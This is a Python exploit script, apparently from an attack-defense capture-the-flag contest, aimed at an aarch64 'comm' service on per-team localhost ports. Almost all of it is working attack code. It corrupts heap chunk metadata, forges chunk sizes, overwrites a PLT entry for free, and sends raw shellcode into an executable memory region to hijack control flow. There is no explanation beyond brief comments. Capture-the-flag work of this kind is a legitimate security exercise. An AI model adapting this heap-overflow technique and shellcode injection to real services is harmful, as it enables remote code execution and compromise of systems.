#!/usr/bin/env python3

import time, socket, struct, argparse

try:
    from pwn import *
    context.arch = 'aarch64'
except:
    pass

#b *0x401584
script = '''
c
'''

def p64(num):
    return struct.pack("<Q", num)

def recv_telemetry():
    if recv:
        print(f"[!] Telemetry Recvied: {t.recv(8)}")

def send_packet(pkt_id, order, data_size, data=None):
    ''' Package a packet struct '''
    pkt  = pkt_id.to_bytes(1, byteorder='little')
    pkt += order.to_bytes(1, byteorder='little')
    pkt += data_size.to_bytes(1, byteorder='little')
    if data is None:
        pkt += b'A' * data_size
    else:
        pkt += data

    print(f"[*] Sending pack with size {len(pkt)}")
    if file_out:
        global cnt
        name = f'pkt_{cnt}'
        with open(name, 'wb') as f:
            f.write(pkt)

        cnt += 1
    else:
        r.send(pkt)
        time.sleep(.1)
        recv_telemetry()

def exploit():
    recv_telemetry()

    send_packet(1, 0, 0x30)
    send_packet(2, 0, 0x20)

    send_packet(3, 0, 21)
    send_packet(4, 0, 8)  # This chunk is freed
    send_packet(5, 0, 0x20)
    send_packet(6, 0, 0x30)
    send_packet(7, 0, 8)
    send_packet(8, 0, 8)
    send_packet(9, 0, 8)

    payload = (b'\x00' * 21) + b'\xe1'
    send_packet(3, 0, 22, payload)

    send_packet(10, 0, 8)
    send_packet(11, 0, 8)

    # Ask for free'ed chunk of 0xe0, real size 0x30
    payload  = b'\x00' * 21
    payload += p64(0x41)
    payload += b'\x00' * 0x38
    payload += p64(0x51)
    payload += b'\x00' * 72
    payload += p64(0x41)
    payload += b'\x00' * (0xc0 - len(payload))
    send_packet(3, 1, 0xc0, payload)

    send_packet(13, 0, 8)
    send_packet(14, 0, 8)

    payload  = b'\x00' * 21
    payload += p64(0x41)
    payload += b'\x00' * 0x38
    payload += p64(0x51)
    payload += p64(mmap_rwx+0xd)
    payload += b'\x00' * 64
    payload += p64(0x41)
    payload += p64(plt_free-0x13)
    payload += b'\x00' * (0xc0 - len(payload))
    send_packet(3, 1, 0xc0, payload)

    send_packet(3, 6, 0x20)
    send_packet(3, 7, 0x30)

    payload = shellcode
    payload += b'\x00' * (0x30 - len(payload))
    send_packet(3, 8, 0x30, payload)

    payload = p64(0x800020)
    payload += p64(jmp_plt)
    payload += b'\x20\x09\x40'
    payload += b'\x00' * (0x10 - len(payload))
    send_packet(3, 9, 0x18, payload)

    send_packet(99, 9, 0x10)

if __name__ == '__main__':
    shellcode = b"\x00\x00\x00\xca\x60\x00\x00\x58\x89\x00\x00\x58\x20\x01\x1f\xd6\x00\x00\x80\x00\x00\x00\x00\x00\x4c\x11\x40\x00"
    shellcode = b"\x00\x00\x00\xca\x60\x00\x00\x58\x89\x00\x00\x58\x20\x01\x1f\xd6\x00\x00\x80\x00\x00\x00\x00\x00\x8c\x11\x40\x00"
    mmap_rwx  = 0x800000
    plt_exit = 0x412008
    plt_puts = 0x412080
    plt_free = 0x412098
    jmp_plt = 0x400920
    cnt = 1
    recv    = False
    file_out = False

    parser = argparse.ArgumentParser()
    parser.add_argument("team",
                        help="Team Number you want to interact to, i.e 1,2,3,4,5,6...",
                        type=int,
                        default=None
                        )
    parser.add_argument("--exploit",
                        help="Actually exploit the comm service",
                        action="store_true"
                        )
    parser.add_argument("--telemetry",
                        help="Spawn a TCP socket to recive telemetry",
                        action="store_true"
                        )
    parser.add_argument("--files",
                        help="Write payloads to files",
                        action="store_true"
                        )
    parser.add_argument("--local",
                        help="Exploit the challenge locally",
                        action="store_true"
                        )

    args = parser.parse_args()


    if args.files:
        file_out = True
    elif args.local:
        r = gdb.debug('build/comm', env={'LD_PRELOAD':'build/libc-2.28.so', 'FLAG':'SATPAGER'}, gdbscript=script)
    else:
        team_comm_port = 4530 + args.team
        r = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        r.connect(('127.0.0.1', team_comm_port))

    if args.telemetry:
        recv = True
        team_telm_port = 4580 + args.team
        #t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #t.connect(('127.0.0.1', team_telm_port))
        t = remote('localhost', team_telm_port)
        #t.connect(('127.0.0.1', team_telm_port))

    if args.exploit:
       exploit()

    else:
        pass


